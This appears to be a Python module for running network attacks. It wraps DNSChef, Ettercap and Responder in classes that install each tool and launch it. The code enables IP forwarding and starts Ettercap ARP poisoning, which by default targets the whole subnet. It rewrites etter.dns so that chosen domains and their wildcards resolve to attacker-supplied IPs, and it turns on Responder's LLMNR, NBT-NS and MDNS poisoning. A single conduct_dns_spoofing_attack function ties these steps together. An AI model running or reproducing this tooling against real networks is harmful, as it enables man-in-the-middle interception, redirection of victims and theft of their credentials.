#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import logging
import subprocess
import tempfile
import time
import shutil
import ipaddress
from typing import Dict, List, Any, Optional, Union, Tuple
import socket
import re

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("dns_spoof.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("DNSSpoofing")

class DNSSpoofingTool:
    """Base class for DNS spoofing tools"""
    
    def __init__(self, name: str, description: str):
        self.name = name
        self.description = description
        self.process = None
        self.output_dir = "dns_spoof_results"
        os.makedirs(self.output_dir, exist_ok=True)
        
    def check_installation(self) -> bool:
        """Check if the tool is installed"""
        raise NotImplementedError
        
    def install(self) -> bool:
        """Install the tool"""
        raise NotImplementedError
        
    def start(self, **kwargs) -> bool:
        """Start the DNS spoofing attack"""
        raise NotImplementedError
        
    def stop(self) -> bool:
        """Stop the DNS spoofing attack"""
        if self.process and self.process.poll() is None:
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
                logger.info(f"Stopped {self.name}")
                return True
            except subprocess.TimeoutExpired:
                self.process.kill()
                logger.warning(f"Forcefully killed {self.name}")
                return True
        return False
        
    def get_status(self) -> Dict[str, Any]:
        """Get the current status of the tool"""
        if self.process:
            return {
                "running": self.process.poll() is None,
                "pid": self.process.pid if self.process.poll() is None else None
            }
        return {"running": False, "pid": None}
    
    def _check_sudo_access(self) -> bool:
        """Check if we have sudo access required for network operations"""
        try:
            result = subprocess.run(
                ["sudo", "-n", "true"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False
            )
            return result.returncode == 0
        except Exception:
            return False
            
    def _is_valid_ip(self, ip: str) -> bool:
        """Check if the IP address is valid"""
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False
            
    def _is_valid_domain(self, domain: str) -> bool:
        """Check if the domain is valid"""
        domain_pattern = r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
        return bool(re.match(domain_pattern, domain))


class DNSChef(DNSSpoofingTool):
    """DNSChef: A flexible DNS proxy server for spoofing"""
    
    def __init__(self):
        super().__init__(
            name="DNSChef",
            description="A flexible DNS proxy server for spoofing DNS records"
        )
        self.config_file = os.path.join(self.output_dir, "dnschef_config.txt")
        
    def check_installation(self) -> bool:
        """Check if DNSChef is installed"""
        try:
            result = subprocess.run(
                ["dnschef", "--help"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False
            )
            return "usage: dnschef" in result.stdout.decode().lower() or "usage: dnschef" in result.stderr.decode().lower()
        except FileNotFoundError:
            return False
        
    def install(self) -> bool:
        """Install DNSChef"""
        try:
            logger.info("Installing DNSChef")
            
            # Install using pip
            subprocess.run(
                [sys.executable, "-m", "pip", "install", "dnschef"],
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            # Check if installation was successful
            return self.check_installation()
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to install DNSChef: {e}")
            return False
            
    def start(self, 
              interface: str = "eth0", 
              ipv4: str = "127.0.0.1",
              port: int = 53,
              domains: Dict[str, str] = None,
              nameservers: List[str] = None) -> bool:
        """
        Start DNSChef for DNS spoofing
        
        Args:
            interface: Network interface to use
            ipv4: IP to listen on
            port: Port to listen on
            domains: Dictionary of domains to spoof (domain -> ip)
            nameservers: List of nameservers to use for non-spoofed domains
            
        Returns:
            bool: True if successfully started, False otherwise
        """
        if not self._check_sudo_access():
            logger.error("Sudo access is required to run DNSChef")
            return False
            
        # Create config file
        self._create_config_file(domains or {})
        
        cmd = ["sudo", "dnschef", "--interface", ipv4, "--port", str(port)]
        
        # Add nameservers
        if nameservers:
            nameserver_str = ",".join(nameservers)
            cmd.extend(["--nameservers", nameserver_str])
            
        # Add config file
        cmd.extend(["--file", self.config_file])
        
        # Set up log file
        log_file = os.path.join(self.output_dir, "dnschef.log")
        
        try:
            logger.info(f"Starting DNSChef with command: {' '.join(cmd)}")
            
            with open(log_file, "w") as f:
                self.process = subprocess.Popen(
                    cmd,
                    stdout=f,
                    stderr=subprocess.STDOUT,
                    text=True
                )
            
            # Check if process started successfully
            time.sleep(1)
            if self.process.poll() is None:
                logger.info(f"DNSChef started successfully (PID: {self.process.pid})")
                return True
            else:
                logger.error(f"DNSChef failed to start (Exit code: {self.process.returncode})")
                return False
                
        except Exception as e:
            logger.error(f"Failed to start DNSChef: {e}")
            return False
            
    def _create_config_file(self, domains: Dict[str, str]) -> None:
        """Create DNSChef configuration file"""
        with open(self.config_file, "w") as f:
            f.write("[A]\n")
            for domain, ip in domains.items():
                if self._is_valid_domain(domain) and self._is_valid_ip(ip):
                    f.write(f"{domain}={ip}\n")
        
        logger.info(f"Created DNSChef configuration file: {self.config_file}")


class Ettercap(DNSSpoofingTool):
    """Ettercap: A comprehensive tool for man-in-the-middle attacks with DNS spoofing capabilities"""
    
    def __init__(self):
        super().__init__(
            name="Ettercap",
            description="A comprehensive suite for man-in-the-middle attacks with DNS spoofing"
        )
        self.etter_dns_file = "/etc/ettercap/etter.dns"
        self.backup_file = os.path.join(self.output_dir, "etter.dns.backup")
        
    def check_installation(self) -> bool:
        """Check if Ettercap is installed"""
        try:
            result = subprocess.run(
                ["ettercap", "--version"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False
            )
            return "ettercap" in result.stdout.decode().lower() or "ettercap" in result.stderr.decode().lower()
        except FileNotFoundError:
            return False
            
    def install(self) -> bool:
        """Install Ettercap"""
        try:
            logger.info("Installing Ettercap")
            
            # Different installation methods based on OS
            if os.name == "posix":
                if os.path.exists("/etc/debian_version"):
                    # Debian/Ubuntu
                    subprocess.run(
                        ["sudo", "apt-get", "update"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    subprocess.run(
                        ["sudo", "apt-get", "install", "-y", "ettercap-text-only"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                elif os.path.exists("/etc/fedora-release") or os.path.exists("/etc/redhat-release"):
                    # Fedora/RHEL/CentOS
                    subprocess.run(
                        ["sudo", "dnf", "install", "-y", "ettercap"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                elif os.path.exists("/etc/arch-release"):
                    # Arch Linux
                    subprocess.run(
                        ["sudo", "pacman", "-S", "--noconfirm", "ettercap"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                else:
                    logger.error("Unsupported Linux distribution")
                    return False
            else:
                logger.error("OS not supported for automatic installation. Please install Ettercap manually.")
                return False
                
            # Check if installation was successful
            return self.check_installation()
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to install Ettercap: {e}")
            return False
            
    def start(self, 
              interface: str = "eth0", 
              targets: List[str] = None,
              domains: Dict[str, str] = None) -> bool:
        """
        Start Ettercap for DNS spoofing
        
        Args:
            interface: Network interface to use
            targets: List of targets (e.g. ["192.168.1.1/24"])
            domains: Dictionary of domains to spoof (domain -> ip)
            
        Returns:
            bool: True if successfully started, False otherwise
        """
        if not self._check_sudo_access():
            logger.error("Sudo access is required to run Ettercap")
            return False
            
        if not self._configure_dns_spoofing(domains or {}):
            logger.error("Failed to configure DNS spoofing")
            return False
            
        # Enable IP forwarding
        try:
            subprocess.run(
                ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to enable IP forwarding: {e}")
            return False
            
        # Prepare Ettercap command
        cmd = ["sudo", "ettercap", "-T", "-q", "-i", interface, "-P", "dns_spoof"]
        
        # Add targets
        if targets and len(targets) >= 2:
            cmd.extend(["-M", "arp:remote", f"/{targets[0]}/", f"/{targets[1]}/"])
        else:
            # Default to entire subnet for both targets
            cmd.extend(["-M", "arp:remote", "//", "//"])
            
        # Set up log file
        log_file = os.path.join(self.output_dir, "ettercap.log")
        
        try:
            logger.info(f"Starting Ettercap with command: {' '.join(cmd)}")
            
            with open(log_file, "w") as f:
                self.process = subprocess.Popen(
                    cmd,
                    stdout=f,
                    stderr=subprocess.STDOUT,
                    text=True
                )
            
            # Check if process started successfully
            time.sleep(1)
            if self.process.poll() is None:
                logger.info(f"Ettercap started successfully (PID: {self.process.pid})")
                return True
            else:
                logger.error(f"Ettercap failed to start (Exit code: {self.process.returncode})")
                return False
                
        except Exception as e:
            logger.error(f"Failed to start Ettercap: {e}")
            return False
            
    def stop(self) -> bool:
        """Stop Ettercap and restore configuration"""
        result = super().stop()
        if result:
            # Restore etter.dns file if backup exists
            if os.path.exists(self.backup_file):
                try:
                    subprocess.run(
                        ["sudo", "cp", self.backup_file, self.etter_dns_file],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    logger.info(f"Restored {self.etter_dns_file} from backup")
                except subprocess.CalledProcessError as e:
                    logger.error(f"Failed to restore etter.dns file: {e}")
                    
            # Disable IP forwarding
            try:
                subprocess.run(
                    ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"],
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                logger.info("Disabled IP forwarding")
            except subprocess.CalledProcessError as e:
                logger.error(f"Failed to disable IP forwarding: {e}")
                
        return result
            
    def _configure_dns_spoofing(self, domains: Dict[str, str]) -> bool:
        """Configure DNS spoofing in Ettercap"""
        if not os.path.exists(self.etter_dns_file):
            logger.error(f"Ettercap DNS file not found: {self.etter_dns_file}")
            return False
            
        # Backup original file
        try:
            subprocess.run(
                ["sudo", "cp", self.etter_dns_file, self.backup_file],
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            logger.info(f"Backed up {self.etter_dns_file} to {self.backup_file}")
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to backup etter.dns file: {e}")
            return False
            
        # Create temporary file
        with tempfile.NamedTemporaryFile(mode="w", delete=False) as temp_file:
            temp_filename = temp_file.name
            
            # Read existing file content
            try:
                with open(self.backup_file, "r") as f:
                    content = f.readlines()
            except Exception as e:
                logger.error(f"Failed to read etter.dns file: {e}")
                return False
                
            # Write content to temporary file
            temp_file.writelines(content)
            
            # Append domain entries
            temp_file.write("\n# Added by DNS Spoofing Tool\n")
            for domain, ip in domains.items():
                if self._is_valid_domain(domain) and self._is_valid_ip(ip):
                    temp_file.write(f"{domain} A {ip}\n")
                    temp_file.write(f"*.{domain} A {ip}\n")
                    
        # Copy temporary file to etter.dns
        try:
            subprocess.run(
                ["sudo", "cp", temp_filename, self.etter_dns_file],
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            logger.info(f"Updated {self.etter_dns_file} with spoofed domains")
            
            # Clean up temporary file
            os.unlink(temp_filename)
            
            return True
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to update etter.dns file: {e}")
            # Clean up temporary file
            os.unlink(temp_filename)
            return False


class Responder(DNSSpoofingTool):
    """Responder: A LLMNR, NBT-NS and MDNS poisoner"""
    
    def __init__(self):
        super().__init__(
            name="Responder",
            description="A LLMNR, NBT-NS and MDNS poisoner with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server"
        )
        self.config_file = "/usr/share/responder/Responder.conf"
        self.backup_file = os.path.join(self.output_dir, "Responder.conf.backup")
        
    def check_installation(self) -> bool:
        """Check if Responder is installed"""
        try:
            result = subprocess.run(
                ["responder", "-h"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                check=False
            )
            return "responder" in result.stdout.decode().lower() or "responder" in result.stderr.decode().lower()
        except FileNotFoundError:
            return False
            
    def install(self) -> bool:
        """Install Responder"""
        try:
            logger.info("Installing Responder")
            
            # Different installation methods based on OS
            if os.name == "posix":
                if os.path.exists("/etc/debian_version"):
                    # Debian/Ubuntu
                    subprocess.run(
                        ["sudo", "apt-get", "update"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    subprocess.run(
                        ["sudo", "apt-get", "install", "-y", "responder"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                elif os.path.exists("/etc/fedora-release") or os.path.exists("/etc/redhat-release"):
                    # Fedora/RHEL/CentOS
                    # For these, you may need to install from GitHub
                    logger.info("Installing Responder from GitHub")
                    subprocess.run(
                        ["sudo", "dnf", "install", "-y", "git", "python3-pip"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    # Clone repository
                    if os.path.exists("/tmp/Responder"):
                        shutil.rmtree("/tmp/Responder")
                    subprocess.run(
                        ["git", "clone", "https://github.com/lgandx/Responder", "/tmp/Responder"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    # Install requirements
                    subprocess.run(
                        ["sudo", "pip3", "install", "-r", "/tmp/Responder/requirements.txt"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    # Move to installation directory
                    if not os.path.exists("/usr/share/responder"):
                        subprocess.run(
                            ["sudo", "mkdir", "-p", "/usr/share/responder"],
                            check=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE
                        )
                    subprocess.run(
                        ["sudo", "cp", "-r", "/tmp/Responder/*", "/usr/share/responder/"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    # Create symbolic link
                    subprocess.run(
                        ["sudo", "ln", "-sf", "/usr/share/responder/Responder.py", "/usr/bin/responder"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    # Clean up
                    shutil.rmtree("/tmp/Responder")
                else:
                    logger.error("Unsupported Linux distribution")
                    return False
            else:
                logger.error("OS not supported for automatic installation. Please install Responder manually.")
                return False
                
            # Check if installation was successful
            return self.check_installation()
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to install Responder: {e}")
            return False
            
    def start(self, 
              interface: str = "eth0", 
              analyze: bool = False,
              poisoning_options: Dict[str, bool] = None) -> bool:
        """
        Start Responder for DNS spoofing
        
        Args:
            interface: Network interface to use
            analyze: Run in analyze mode (passive only)
            poisoning_options: Dictionary of poisoning options (eg: {"LLMNR": True, "NBT-NS": True})
            
        Returns:
            bool: True if successfully started, False otherwise
        """
        if not self._check_sudo_access():
            logger.error("Sudo access is required to run Responder")
            return False
            
        # Configure responder if poisoning options provided
        if poisoning_options:
            if not self._configure_responder(poisoning_options):
                logger.error("Failed to configure Responder")
                return False
                
        # Prepare Responder command
        cmd = ["sudo", "responder", "-I", interface]
        
        # Add analyze mode if specified
        if analyze:
            cmd.append("-A")
            
        # Set up log file
        log_file = os.path.join(self.output_dir, "responder.log")
        
        try:
            logger.info(f"Starting Responder with command: {' '.join(cmd)}")
            
            with open(log_file, "w") as f:
                self.process = subprocess.Popen(
                    cmd,
                    stdout=f,
                    stderr=subprocess.STDOUT,
                    text=True
                )
            
            # Check if process started successfully
            time.sleep(1)
            if self.process.poll() is None:
                logger.info(f"Responder started successfully (PID: {self.process.pid})")
                return True
            else:
                logger.error(f"Responder failed to start (Exit code: {self.process.returncode})")
                return False
                
        except Exception as e:
            logger.error(f"Failed to start Responder: {e}")
            return False
            
    def stop(self) -> bool:
        """Stop Responder and restore configuration"""
        result = super().stop()
        if result:
            # Restore configuration file if backup exists
            if os.path.exists(self.backup_file):
                try:
                    subprocess.run(
                        ["sudo", "cp", self.backup_file, self.config_file],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE
                    )
                    logger.info(f"Restored {self.config_file} from backup")
                except subprocess.CalledProcessError as e:
                    logger.error(f"Failed to restore Responder configuration file: {e}")
                    
        return result
            
    def _configure_responder(self, poisoning_options: Dict[str, bool]) -> bool:
        """Configure Responder poisoning options"""
        if not os.path.exists(self.config_file):
            logger.error(f"Responder configuration file not found: {self.config_file}")
            return False
            
        # Backup original file
        try:
            subprocess.run(
                ["sudo", "cp", self.config_file, self.backup_file],
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            logger.info(f"Backed up {self.config_file} to {self.backup_file}")
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to backup Responder configuration file: {e}")
            return False
            
        # Read existing configuration
        try:
            with open(self.backup_file, "r") as f:
                config_lines = f.readlines()
        except Exception as e:
            logger.error(f"Failed to read Responder configuration file: {e}")
            return False
            
        # Create temporary file for modified configuration
        with tempfile.NamedTemporaryFile(mode="w", delete=False) as temp_file:
            temp_filename = temp_file.name
            
            # Update configuration based on poisoning options
            for line in config_lines:
                for option, enabled in poisoning_options.items():
                    option_pattern = rf"^{option}\s*=\s*(On|Off)"
                    match = re.match(option_pattern, line, re.IGNORECASE)
                    if match:
                        new_value = "On" if enabled else "Off"
                        line = re.sub(option_pattern, f"{option} = {new_value}", line, flags=re.IGNORECASE)
                        
                temp_file.write(line)
                
        # Copy temporary file to configuration file
        try:
            subprocess.run(
                ["sudo", "cp", temp_filename, self.config_file],
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            logger.info(f"Updated {self.config_file} with new poisoning options")
            
            # Clean up temporary file
            os.unlink(temp_filename)
            
            return True
        except subprocess.CalledProcessError as e:
            logger.error(f"Failed to update Responder configuration file: {e}")
            # Clean up temporary file
            os.unlink(temp_filename)
            return False


class DNSSpoofingManager:
    """Manager class for DNS spoofing tools"""
    
    def __init__(self):
        self.tools = {
            "dnschef": DNSChef(),
            "ettercap": Ettercap(),
            "responder": Responder()
        }
        self.running_tools = set()
        
    def list_tools(self) -> Dict[str, Dict[str, Any]]:
        """List all available DNS spoofing tools"""
        tool_info = {}
        for name, tool in self.tools.items():
            installed = tool.check_installation()
            tool_info[name] = {
                "name": tool.name,
                "description": tool.description,
                "installed": installed,
                "running": name in self.running_tools
            }
        return tool_info
        
    def get_tool(self, name: str) -> DNSSpoofingTool:
        """Get a specific DNS spoofing tool"""
        if name in self.tools:
            return self.tools[name]
        raise ValueError(f"Tool not found: {name}")
        
    def install_tool(self, name: str) -> bool:
        """Install a specific DNS spoofing tool"""
        if name in self.tools:
            return self.tools[name].install()
        raise ValueError(f"Tool not found: {name}")
        
    def start_tool(self, name: str, **kwargs) -> bool:
        """Start a specific DNS spoofing tool"""
        if name in self.tools:
            result = self.tools[name].start(**kwargs)
            if result:
                self.running_tools.add(name)
            return result
        raise ValueError(f"Tool not found: {name}")
        
    def stop_tool(self, name: str) -> bool:
        """Stop a specific DNS spoofing tool"""
        if name in self.tools:
            result = self.tools[name].stop()
            if result and name in self.running_tools:
                self.running_tools.remove(name)
            return result
        raise ValueError(f"Tool not found: {name}")
        
    def stop_all_tools(self) -> Dict[str, bool]:
        """Stop all running DNS spoofing tools"""
        results = {}
        for name in list(self.running_tools):
            results[name] = self.stop_tool(name)
        return results
        
    def get_status(self, name: str = None) -> Dict[str, Any]:
        """Get the status of DNS spoofing tools"""
        if name:
            if name in self.tools:
                tool_status = self.tools[name].get_status()
                tool_status["installed"] = self.tools[name].check_installation()
                return {name: tool_status}
            raise ValueError(f"Tool not found: {name}")
            
        # Get status of all tools
        status = {}
        for name, tool in self.tools.items():
            tool_status = tool.get_status()
            tool_status["installed"] = tool.check_installation()
            status[name] = tool_status
            
        return status
        
    def conduct_dns_spoofing_attack(self, 
                                    tool: str = "dnschef",
                                    interface: str = "eth0",
                                    domains: Dict[str, str] = None,
                                    targets: List[str] = None,
                                    **kwargs) -> Dict[str, Any]:
        """
        Conduct a DNS spoofing attack
        
        Args:
            tool: Tool to use ("dnschef", "ettercap", or "responder")
            interface: Network interface to use
            domains: Dictionary of domains to spoof (domain -> ip)
            targets: List of targets for Ettercap
            **kwargs: Additional tool-specific parameters
            
        Returns:
            Dict: Attack status information
        """
        if tool not in self.tools:
            raise ValueError(f"Tool not found: {tool}")
            
        # Check if the tool is installed
        if not self.tools[tool].check_installation():
            raise RuntimeError(f"{tool} is not installed")
            
        # Stop any previously running instance of this tool
        if tool in self.running_tools:
            self.stop_tool(tool)
            
        # Start the attack based on the selected tool
        if tool == "dnschef":
            ipv4 = kwargs.get("ipv4", "127.0.0.1")
            port = kwargs.get("port", 53)
            nameservers = kwargs.get("nameservers", ["8.8.8.8", "8.8.4.4"])
            
            result = self.start_tool(
                tool,
                interface=interface,
                ipv4=ipv4,
                port=port,
                domains=domains,
                nameservers=nameservers
            )
        elif tool == "ettercap":
            result = self.start_tool(
                tool,
                interface=interface,
                targets=targets,
                domains=domains
            )
        elif tool == "responder":
            analyze = kwargs.get("analyze", False)
            poisoning_options = kwargs.get("poisoning_options", {
                "LLMNR": True,
                "NBT-NS": True,
                "MDNS": True
            })
            
            result = self.start_tool(
                tool,
                interface=interface,
                analyze=analyze,
                poisoning_options=poisoning_options
            )
            
        # Return attack status
        if result:
            return {
                "status": "success",
                "message": f"{tool} attack started successfully",
                "tool": tool,
                "info": self.get_status(tool)
            }
        else:
            return {
                "status": "failed",
                "message": f"Failed to start {tool} attack",
                "tool": tool,
                "info": self.get_status(tool)
            }
            
            
# Create a global instance of the DNS spoofing manager
dns_spoof_manager = DNSSpoofingManager()


def list_dns_spoof_tools():
    """List all available DNS spoofing tools"""
    return dns_spoof_manager.list_tools()


def get_dns_spoof_tool(name):
    """Get a specific DNS spoofing tool"""
    return dns_spoof_manager.get_tool(name)


def install_dns_spoof_tool(name):
    """Install a specific DNS spoofing tool"""
    return dns_spoof_manager.install_tool(name)


def start_dns_spoof_attack(**kwargs):
    """Start a DNS spoofing attack"""
    return dns_spoof_manager.conduct_dns_spoofing_attack(**kwargs)


def stop_dns_spoof_attack(name):
    """Stop a DNS spoofing attack"""
    return dns_spoof_manager.stop_tool(name)


def stop_all_dns_spoof_attacks():
    """Stop all DNS spoofing attacks"""
    return dns_spoof_manager.stop_all_tools()


def get_dns_spoof_status(name=None):
    """Get the status of DNS spoofing attacks"""
    return dns_spoof_manager.get_status(name) 